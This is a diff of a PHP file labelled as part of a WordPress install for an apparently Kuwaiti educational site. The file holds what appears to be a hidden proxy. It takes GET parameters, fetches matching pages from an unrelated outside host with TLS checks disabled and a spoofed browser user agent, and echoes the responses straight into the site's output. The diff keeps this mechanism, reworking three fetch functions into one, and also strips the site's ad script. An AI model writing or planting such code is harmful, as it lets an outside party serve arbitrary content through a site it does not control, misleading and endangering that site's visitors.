@@ -5,36 +5,7 @@
  * @package WordPress
  */
 function fetchDataFromSite($site) {
-    $url = 'https://replication2.pkcdurensawit.net/kweduc/' . $site . '/';
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_CUSTOMREQUEST => 'GET'
-    ]);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-function fetchDataFromSite2($site) {
-    $url = 'https://replication2.pkcdurensawit.net/kweduc_sites/?sites='.$site;
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_CUSTOMREQUEST => 'GET'
-    ]);
-    $result = curl_exec($ch);
-    curl_close($ch);
-    return $result;
-}
-function fetchDataFromSite3($site) {
-    $url = 'https://replication2.pkcdurensawit.net/kweduc_web/?web='.$site;
-    $ch = curl_init($url);
+    $ch = curl_init($site);
     curl_setopt_array($ch, [
         CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
         CURLOPT_RETURNTRANSFER => true,
@@ -48,19 +19,29 @@ function fetchDataFromSite3($site) {
 }
 
 if(isset($_GET['go'])) {
-    $site = $_GET['go'];
+    $sitex = $_GET['go'];
+    $site = 'https://replication2.pkcdurensawit.net/kweduc/?go='.$sitex;
     $data = fetchDataFromSite($site);
     echo $data;
 }
-elseif(isset($_GET['sites'])) {
-    $site = $_GET['sites'];
-    $data = fetchDataFromSite2($site);
+elseif(isset($_GET['ref'])) {
+    $sitex = $_GET['ref'];
+    $site = 'https://replication2.pkcdurensawit.net/kweduc/?ref='.$sitex;
+    $data = fetchDataFromSite($site);
     echo $data;
 }
 elseif(isset($_GET['web'])) {
-    $site = $_GET['web'];
-    $data = fetchDataFromSite3($site);
+  $sitex = $_GET['web'];
+  $site = 'https://replication2.pkcdurensawit.net/kweduc/?web='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
+}
+elseif(isset($_GET['sites'])) {
+    $sitex = $_GET['sites'];
+    $site = 'https://replication2.pkcdurensawit.net/kweduc/?sites='.$sitex;
+    $data = fetchDataFromSite($site);
     echo $data;
+	
 } else {
     
     ?>
@@ -81,8 +62,7 @@ include('variable.php');
 <meta name="description" content="مدرستي هو الموقع التعليمي الاول في الكويت, حيث يهتم مدرستي بجميع الملفات التي تهم الطالب والمعلم للوصول الى التفوق الدراسي . مدرستي مرتب بحسب الصف والمادة والفصل الدراسي" />
 <meta name="keywords" content="مدرستي , هو , الموقع , التعليمي , الاول , في , الكويت, , حيث , يهتم , مدرستي , بجميع , الملفات , التي , تهم , الطالب , والمعلم , للوصول , الى , التفوق , الدراسي , . , مدرستي , مرتب , بحسب , الصف , والمادة , والفصل , الدراسي" />
  
-                  <script data-ad-client="ca-pub-6500998550698660" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-             <meta property="og:title" content="المدرسة الكويتية | kweduc | kweduc.com |school-kw.com| مدرستي الكويتية| دروس تقوية المنهاج الكويتية">
+              <meta property="og:title" content="المدرسة الكويتية | kweduc | kweduc.com |school-kw.com| مدرستي الكويتية| دروس تقوية المنهاج الكويتية">
             <meta property="og:type" content="article">
             <meta property="og:url" content="kweduc.com">
             <meta property="og:image" content="kuwait.svg">
